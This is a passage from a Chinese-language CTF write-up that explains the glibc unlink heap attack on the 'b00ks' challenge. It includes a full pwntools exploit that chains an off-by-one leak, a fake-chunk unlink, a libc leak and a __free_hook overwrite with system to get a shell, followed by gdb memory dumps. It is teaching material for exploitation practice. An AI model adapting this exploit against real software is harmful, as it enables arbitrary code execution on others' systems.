  1. FD = b->fd; //实际就是FD=a
  2. BK = b->bk; //实际就是BK=c
  3. FD->bk = BK; //就是从a->b变成a->c
  4. BK->fd = FD; //就是从c->b变成c->a
那unlink为什么能利用，进行攻击呢？我也纠结了这个很久，从ctf-wiki上了解的过去的unlink就不讲了，那时候的攻击方式比较简单，我只讲现今的unlink攻击方式  
我们可以通过伪造chunk，让他解链的时候unlink一个我们伪造的chunk，这样的话，我们实际就达到了一个赋值的效果，而具体的效果从例子中讲解吧
##### unlink攻击过程
  1. 利用off-by-one覆盖掉结果的null字节，泄露第一个堆块的地址
  2. 泄露掉后利用unlink，使得堆块4的mem部分的指针指向ptr-0x18处，ptr-0x18为自定义的地址，其实就是堆块4，就是create出来的那个堆块
  3. 覆盖堆块4的内容，修改了堆块4的description的指针，指向了堆块6的description部分的指针
  4. 其实第三部分就相当于获得了一个任意地址读写的指针
  5. 这里有好几次修改容易绕晕，我绕了两天才绕出来，第一次修改的时候是将chunk4整体改写，从开头到description指针，全部改掉，将chunk4的description指向chunk6结构体的description
  6. 然后第二次编辑的时候就是编辑chunk6结构体的description，这样就可以修改chunk6的description指针指向任意地点
  7. 利用这个特性输出，输出了libc的地址，具体libc在哪个位置可以通过调试得到
  8. 利用这个特性任意地址写  
先对整体过程有个大概的了解，在一步步讲
##### 过程中的坑
  1. 开头remove两次是有原因的，这样会让堆块6的结构体在前面几个堆块内，因为堆块同样大小的在free过后在malloc后会再次利用，这样方便我们自己调试查看以及利用
  2. 调试时候的计算问题，可以用你当时调试出来的减去后两位数字，获得个heap_base这样直接利用heap_base + 偏移比较快计算结果
  3. 当申请不是16的整数倍的时候，他会转换成16的整数倍，比如我exp中的0x108，实际大小会变成111，还有个1是标记的，他会将下一个chunk的pre_size拿来使用，因为没有free的话，pre_size是没用的，为了不浪费空间，就使用了
##### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from PwnContext.core import *
    # Set up pwntools for the correct architecture
    elf = context.binary = ELF('b00ks')
    LIBC = args.LIBC or 'libc.so.6'
    local = 1
    host = args.HOST or '127.0.0.1'
    port = int(args.PORT or 1080)
    ctx.binary = 'b00ks'
    ctx.remote_libc = LIBC
    ctx.debug_remote_libc = True
    if ctx.debug_remote_libc == False:
        libc = elf.libc
    else:
        libc = ctx.remote_libc
    if local:
        context.log_level = 'debug'
        io = ctx.start()
    else:
        io = remote(host,port)
    def cmd(choice):
        io.recvuntil(">")
        io.sendline(str(choice))
    def create(book_size, book_name, desc_size, desc):
        cmd(1)
        io.sendlineafter(": ", str(book_size))
        io.recvuntil(": ")
        if len(book_name) == book_size:#deal with overflow
            io.send(book_name)
        else:
            io.sendline(book_name)
        io.recvuntil(": ")
        io.sendline(str(desc_size))
        if len(desc) == desc_size:
            io.send(desc)
        else:
            io.sendline(desc)
    def remove(idx):
        cmd(2)
        io.sendlineafter(": ", str(idx))
    def edit(idx, desc):
        cmd(3)
        io.sendlineafter(": ", str(idx))
        io.sendlineafter(": ", str(desc))
    def printf():
        cmd(4)
    def author_name(name):
        cmd(5)
        io.sendlineafter(": ", str(name))
    def exp():
        io.sendlineafter(": ", "author".rjust(0x20,'a'))
        create(0x20, '11111', 0x20, 'b') #1
        printf()
        io.recvuntil('Author: ')
        io.recvuntil("author")
        first_heap = u64(io.recvline().strip().ljust(8, '\x00'))
        create(0x20, "22222", 0x20, "desc buf") #2
        create(0x20, "33333", 0x20, "desc buf") #3
        remove(2)
        remove(3)
        create(0x20, "33333", 0x108, 'overflow') #4
        create(0x20, "44444", 0x100-0x10, 'target') #5
        create(0x20, "/bin/sh\x00", 0x200, 'to arbitrary read and write') #6
        heap_base = first_heap - 0x80
        ptr = heap_base + 0x180
        payload = p64(0) + p64(0x101) + p64(ptr-0x18) + p64(ptr-0x10) + '\x00'*0xe0 + p64(0x100)
        edit(4, payload)
        remove(5)
        payload = p64(0x30) + p64(4) + p64(first_heap+0x40)*2
        edit(4, payload)
        edit(4, p64(heap_base + 0x1e0))
        printf()
        for _ in range(3):
            io.recvuntil('Description: ')
        content = io.recvline()
        io.info(content)
        libc_base = u64(content.strip().ljust(8, '\x00'))-0x3c4b78
        io.success("libc_base: 0x%x" % libc_base)
        system_addr = libc_base + libc.symbols['system']
        io.success('system: 0x%x' % system_addr)
        free_hook = libc_base + libc.symbols['__free_hook']
        payload = p64(free_hook) + p64(0x200)
        edit(4, payload)
        edit(6, p64(system_addr))
        io.success('first_heap: 0x%x' % first_heap)
        remove(6)
        #gdb.attach(io)
    if __name__ == '__main__':
        exp()
        io.interactive()
同样，我只讲解exp部分的内容，其余一样是准备工作
##### 填充并泄露堆块1地址
一样的过程，利用off-by-one泄露地址，不讲了，只讲重点
    io.sendlineafter(": ", "author".rjust(0x20,'a'))
        create(0x20, '11111', 0x20, 'b') #1
        printf()
        io.recvuntil('Author: ')
        io.recvuntil("author")
        first_heap = u64(io.recvline().strip().ljust(8, '\x00'))
##### 创建堆块并remove掉
    create(0x20, "22222", 0x20, "desc buf") #2
        create(0x20, "33333", 0x20, "desc buf") #3
        remove(2)
        remove(3)
这里是要将book6的结构体位置放到前面，方便利用，你可以自己去调试试试，不这样做的话，位置很难找，因为他定义的存储这个结构体的大小也是0x20+0x10(数据部分+结构部分)
##### unlink部分(重点)
    create(0x20, "33333", 0x108, 'overflow') #4
        create(0x20, "44444", 0x100-0x10, 'target') #5
        create(0x20, "/bin/sh\x00", 0x200, 'to arbitrary read and write') #6
        heap_base = first_heap - 0x80
        ptr = heap_base + 0x180
        payload = p64(0) + p64(0x101) + p64(ptr-0x18) + p64(ptr-0x10) + '\x00'*0xe0 + p64(0x100)
        edit(4, payload)
        remove(5)
  1. 创建两个smallchunk，因为unlink只有在smallbin下才可以，fastbin不行
  2. 最后一个chunk是用来编辑的，以及free的，free的参数要带/bin/sh，就是要将他改写成system函数
  3. heap_base = first_heap - 0x80这个偏移自己定，每次调试可能都不一样，反正只要对的上你自己调试的时候就行，方便自己计算，我这里调试的时候是  
[+] first_heap: 0x56182d174080所以减了0x80
    gdb-peda$ x/50gx 0x5653ee7a5080
    0x5653ee7a5080: 0x0000000000000001  0x00005653ee7a5020
    0x5653ee7a5090: 0x00005653ee7a5050  0x0000000000000020
    0x5653ee7a50a0: 0x0000000000000000  0x0000000000000031
    0x5653ee7a50b0: 0x0000000000000006  0x00005653ee7a50e0
    0x5653ee7a50c0: 0x00005653ee7a53e0  0x0000000000000200
    0x5653ee7a50d0: 0x0000000000000000  0x0000000000000031
    0x5653ee7a50e0: 0x0068732f6e69622f  0x0000000000000000
    0x5653ee7a50f0: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5100: 0x0000000000000000  0x0000000000000031
    0x5653ee7a5110: 0x0000565300000005  0x00005653ee7a5140
    0x5653ee7a5120: 0x00005653ee7a52e0  0x00000000000000f0
    0x5653ee7a5130: 0x0000000000000000  0x0000000000000031
    0x5653ee7a5140: 0x0000003434343434  0x0000000000000000
    0x5653ee7a5150: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5160: 0x0000000000000000  0x0000000000000031
    0x5653ee7a5170: 0x0000565300000004  0x00005653ee7a51a0
    0x5653ee7a5180: 0x00005653ee7a51d0  0x0000000000000108
    0x5653ee7a5190: 0x0000000000000000  0x0000000000000031
    0x5653ee7a51a0: 0x0000003333333333  0x00005653ee7a5140
    0x5653ee7a51b0: 0x00005653ee7a5170  0x0000000000000020
    0x5653ee7a51c0: 0x0000000000000000  0x0000000000000111 #chunk4
    0x5653ee7a51d0: 0x0000000000000000  0x0000000000000101 #实际可以写部分
    0x5653ee7a51e0: 0x00005653ee7a5168  0x00005653ee7a5170
    0x5653ee7a51f0: 0x0000000000000000  0x0000000000000000
    0x5653ee7a5200: 0x0000000000000000  0x0000000000000000
这是我显示first_heap后的数据，0x5653ee7a51d0便是申请的0x108的chunk，我在这里伪造了一个chunk，fd和bk在0x5653ee7a51e0，然后通过溢出将下个chunk的pre_size改成我这个伪造的chunk大小  
在看看相邻的堆块
    gdb-peda$ x/50gx 0x5653ee7a51c0
    0x5653ee7a51c0: 0x0000000000000000  0x0000000000000111